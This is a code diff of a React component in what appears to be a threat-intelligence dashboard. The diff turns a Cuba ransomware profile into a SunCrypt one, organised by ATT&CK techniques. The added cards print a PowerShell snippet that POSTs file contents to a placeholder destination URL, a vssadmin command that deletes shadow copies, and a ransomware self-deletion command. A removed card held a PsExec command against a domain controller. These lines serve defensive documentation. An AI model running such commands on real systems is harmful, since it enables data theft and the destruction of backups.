+				</div>
+				<div className='card-body pt-3'>
+					<div className='text-gray-700 fs-4 mb-7 fst-italic'>They find System Information with GetSystemInfo function. *GetSystemInfo*</div>
+					
+					
 					
 				</div>
 			</div>
@@ -687,21 +525,9 @@ const Cuba: React.FC<Propx> = ({className}) => {
 					</div>
 				</div>
 				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>While we cannot validate how specifically PsExec was used because there was not an SMB parser on the infected hosts, we can see that PsExec was used to move files between the infected hosts.</div>
+					<div className='text-gray-700 fs-4 mb-7 fst-italic'>They also brute-forced RDP connections on victim infrastructure.</div>
 					
-					<div className='fs-2 fw-bold pb-3'>Command</div>
-					<div className='mb-5'>
-						<span className='badge badge-light-danger fs-7 fw-bold my-2'>windows</span>
-						<span>&nbsp;&nbsp;</span>
-						
-						<span className='badge badge-light-primary fs-7 fw-bold my-2'>cmd</span>
-						<span>&nbsp;&nbsp;</span>
 					
-						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>
-							<div>&deg;&nbsp;PsExec -u administrator -p 123456 DOMAIN_CONTROLLER cmd</div>
-							
-						</div>
-					</div>
 					
 				</div>
 			</div>
@@ -718,9 +544,26 @@ const Cuba: React.FC<Propx> = ({className}) => {
 					</div>
 				</div>
 				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>The exfiltrated data is published on a dedicated Cuba DLS (Data Leak Site).</div>
+					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Suncrypt copies and exfiltrates victim data using CobaltStrike.</div>
 					
+					<div className='fs-2 fw-bold pb-3'>Command</div>
+					<div className='mb-5'>
+						<span className='badge badge-light-danger fs-7 fw-bold my-2'>windows</span>
+						<span>&nbsp;&nbsp;</span>
+						
+						<span className='badge badge-light-primary fs-7 fw-bold my-2'>psh</span>
+						<span>&nbsp;&nbsp;</span>
 					
+						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>
+							<div>&deg;&nbsp;if(-not (Test-Path #filepath))</div>
+							<div>&deg;&nbsp;  1..100 | ForEach-Object  Add-Content -Path #filepath -Value "This is line $_." </div>
+							<div>&deg;&nbsp;</div>
+							<div>&deg;&nbsp;[System.Net.ServicePointManager]::Expect100Continue = $false</div>
+							<div>&deg;&nbsp;$filecontent = Get-Content -Path #filepath</div>
+							<div>&deg;&nbsp;Invoke-WebRequest -Uri #destination_url -Method POST -Body $filecontent -DisableKeepAlive</div>
+							
+						</div>
+					</div>
 					
 				</div>
 			</div>
@@ -732,25 +575,70 @@ const Cuba: React.FC<Propx> = ({className}) => {
 			<div className='card card-xl-stretch mb-xl-8'>
 				<div className='card-header align-items-center border-0 mt-4'>
 					<div className='symbol symbol-50px pb-1'>
+						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1490</span>
+						<span className='text-dark fw-bold mb-1 fs-3'>- Inhibit System Recovery</span>
+					</div>
+				</div>
+				<div className='card-body pt-3'>
+					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Suncrypt uses batch script to delete shadow copies. (It maybe use WMI, vssadmin) And after clearing the event log, the ransomware deletes itself from disk by executing cmd.exe with the following command.</div>
+					
+					<div className='fs-2 fw-bold pb-3'>Command</div>
+					<div className='mb-5'>
+						<span className='badge badge-light-danger fs-7 fw-bold my-2'>windows</span>
+						<span>&nbsp;&nbsp;</span>
+						
+						<span className='badge badge-light-primary fs-7 fw-bold my-2'>cmd</span>
+						<span>&nbsp;&nbsp;</span>
+					
+						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>
+							<div>&deg;&nbsp;cmd /C ping 127.0.0.1 -n 10  nul & del /f /q “path to the currently running process”  nul  </div>
+							<div>&deg;&nbsp;cmd /c vssadmin.exe delete shadows</div>
+							
+						</div>
+					</div>
+					
+				</div>
+			</div>
+		</div>
+		<div className='col-xl-6'>
+			<div className='card card-xl-stretch mb-xl-8'>
+				<div className='card-header align-items-center border-0 mt-4'>
+					<div className='symbol symbol-50px pb-1'>
 						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1486</span>
 						<span className='text-dark fw-bold mb-1 fs-3'>- Data Encrypted for Impact</span>
 					</div>
 				</div>
 				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Files are encrypted using ChaCha20 with 12-bytes length IV. The keys are encrypted with RSA-4096 algorithm. The RSA implementation is likely copied from the following repository(https://github.com/wolfSSL/wolfssl).</div>
+					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Using PSExec, ransomware encrypts victim data.</div>
 					
 					
 					<div className='fs-2 fw-bold pb-3'>Encryption algorithm</div>
 					<div className='ms-5 mb-5'>
-						<span className='badge badge-light-info fs-7 fw-bold my-2'>ChaCha20</span>
+						<span className='badge badge-light-info fs-7 fw-bold my-2'>Curve25519</span>
 						<span>&nbsp;&nbsp;</span>
-						<span className='badge badge-light-info fs-7 fw-bold my-2'>RSA-4096</span>
+						<span className='badge badge-light-info fs-7 fw-bold my-2'>ChaCha20</span>
 						<span>&nbsp;&nbsp;</span>
 						
 					</div>
 					<div className='fs-2 fw-bold pb-3'>Added Extension</div>
-					<div className='fs-4 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>.cuba</div>
+					<div className='fs-4 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>.(Randomstr)</div>
 						
+				</div>
+			</div>
+		</div>
+		<div className='col-xl-6'>
+			<div className='card card-xl-stretch mb-xl-8'>
+				<div className='card-header align-items-center border-0 mt-4'>
+					<div className='symbol symbol-50px pb-1'>
+						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1498</span>
+						<span className='text-dark fw-bold mb-1 fs-3'>- Network Denial of Service</span>
+					</div>
+				</div>
+				<div className='card-body pt-3'>
+					<div className='text-gray-700 fs-4 mb-7 fst-italic'>After data theft and encryption, the attacker launches a DDoS attack against the victim’s infrastructure and services, preventing them from conducting business and pressuring them to pay the ransom.</div>
+					
+					
+					
 				</div>
 			</div>
 		</div>
@@ -759,4 +647,4 @@ const Cuba: React.FC<Propx> = ({className}) => {
   )
 }
 
-export {Cuba}
+export {SunCrypt}
